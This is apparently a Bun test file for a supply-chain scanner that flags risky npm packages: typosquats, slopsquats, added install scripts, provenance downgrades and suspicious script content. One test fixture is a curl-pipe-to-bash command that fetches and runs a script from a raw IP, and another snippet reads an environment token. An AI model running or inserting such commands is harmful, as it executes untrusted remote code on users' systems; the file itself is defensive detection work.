import { test, expect } from "bun:test";
import { scanShell, scanJs, analyze, type AnalysisInput } from "../src/index.ts";

function base(overrides: Partial<AnalysisInput> = {}): AnalysisInput {
  return {
    name: "x",
    version: "1.0.0",
    isNewPackage: false,
    meta: { maintainers: ["a"], existsOnRegistry: true },
    addedScripts: {},
    changedScripts: {},
    scanFiles: [],
    ...overrides,
  };
}
const idsOf = (signals: ReturnType<typeof analyze>) => signals.map((s) => s.id);

test("scanShell detects curl-pipe and raw IP", () => {
  const f = scanShell("curl -s http://185.1.2.3/i.sh | bash");
  expect(f.some((x) => x.kind === "network")).toBe(true);
  expect(f.some((x) => x.kind === "shell_exec")).toBe(true);
  expect(f.some((x) => x.kind === "raw_ip")).toBe(true);
});

test("scanShell quiet on a normal build script", () => {
  expect(scanShell("tsc && bun test")).toHaveLength(0);
});

test("scanJs detects child_process, network, base64, env", () => {
  const kinds = scanJs("const cp=require('child_process');const h=require('https');Buffer.from(x,'base64');process.env.TOKEN;").map((f) => f.kind);
  expect(kinds).toContain("child_process");
  expect(kinds).toContain("network");
  expect(kinds).toContain("base64");
  expect(kinds).toContain("env_exfil");
});

test("scanJs quiet on plain library code", () => {
  expect(scanJs("export const add=(a,b)=>a+b;")).toHaveLength(0);
});

test("install script added is flagged as an action signal", () => {
  const s = analyze(base({ addedScripts: { postinstall: "node ./setup.js" } }));
  expect(s.some((x) => x.id === "install-script-added" && x.action)).toBe(true);
});

test("typosquat of a very popular package flags high", () => {
  const s = analyze(base({ name: "lodahs", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 47, ageDays: 0.5 } }));
  expect(idsOf(s)).toContain("typosquat");
  // newness signals present too (they will count because an action signal exists)
  expect(idsOf(s)).toContain("low-install-history");
});

test("delimiter variant of a real package is only a low-weight signal", () => {
  const s = analyze(base({ name: "class-names", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 5_000_000 } }));
  const t = s.find((x) => x.category === "typosquat");
  expect(t?.id).toBe("delimiter-variant");
  expect(t!.weight).toBeLessThan(40);
});

test("nonexistent name is a slopsquat block-weight signal", () => {
  const s = analyze(base({ name: "react-codeshift", meta: { maintainers: [], existsOnRegistry: false } }));
  const slop = s.find((x) => x.category === "slopsquat");
  expect(slop?.weight).toBeGreaterThanOrEqual(80);
});

test("provenance downgrade + maintainer change flag", () => {
  const s = analyze(
    base({
      name: "axios-style",
      meta: {
        maintainers: ["attacker"],
        previousMaintainers: ["original"],
        previousHadProvenance: true,
        hasProvenance: false,
        existsOnRegistry: true,
      },
    }),
  );
  expect(idsOf(s)).toContain("provenance-downgrade");
  expect(idsOf(s)).toContain("maintainer-changed");
});

test("clean package yields no action signals", () => {
  const s = analyze(base({ name: "tiny-slugify", meta: { maintainers: ["dev"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 400 }, scanFiles: [{ path: "index.js", text: "export const x=1;" }] }));
  expect(s.filter((x) => x.action)).toHaveLength(0);
});
